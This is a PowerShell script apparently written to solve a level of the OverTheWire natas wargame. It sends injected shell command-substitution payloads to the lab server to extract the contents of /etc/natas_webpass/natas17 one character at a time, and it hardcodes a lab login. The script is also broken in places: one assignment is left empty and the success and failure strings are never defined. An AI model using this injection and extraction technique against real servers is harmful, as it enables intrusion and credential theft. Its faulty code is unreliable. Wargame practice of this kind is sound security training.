$url = "http://natas17.natas.labs.overthewire.org/?debug"    
$authorization = "Basic bmF0YXMxNzpFcWpISmJvN0xGTmI4dndoSGI5czc1aG9raDVURjBPQwo="

$headers = @{
    "Authorization" = $authorization
    #"Content-Type"  = "application/x-www-form-urlencoded"
}

$lowercaseChars = 97..122 | ForEach-Object { [char]$_ }
$uppercaseChars = 65..90 | ForEach-Object { [char]$_ }
$numbers = 48..57 | ForEach-Object { [char]$_ }

$all_characters = $lowercaseChars + $uppercaseChars + $numbers

function Send_Command {
    param (
        [string]$command
    )
    if ($command) {
            $response = 
            if (!$response) {
                Write-Host "Error!"
                exit
            }
        return $response
    }
}

$FileName = '/etc/natas_webpass/natas17'
$result = ""
for ($position = 1; $position -le 32; $position ++) {    
    
    foreach ($char in $all_characters) {  	 

        $command = '$(bash /tmp/myb64decoded ' + $char + ' ' + $position + ' ' + $FileName + ')'
        $response = Invoke-WebRequest -URI $url -Headers $headers -Method 'GET' -UseBasicParsing $command

        if ($response) {
            if ($response.Content -like "*$correctStr*") {
                if ($response.Content -notlike "*$wrongStr*") {
                    $result += $char
                    Write-Host "Char $position" + ": $char"
                    break
                }
            }
        }
    }
}

write-host `n"PASSWORD: $result"


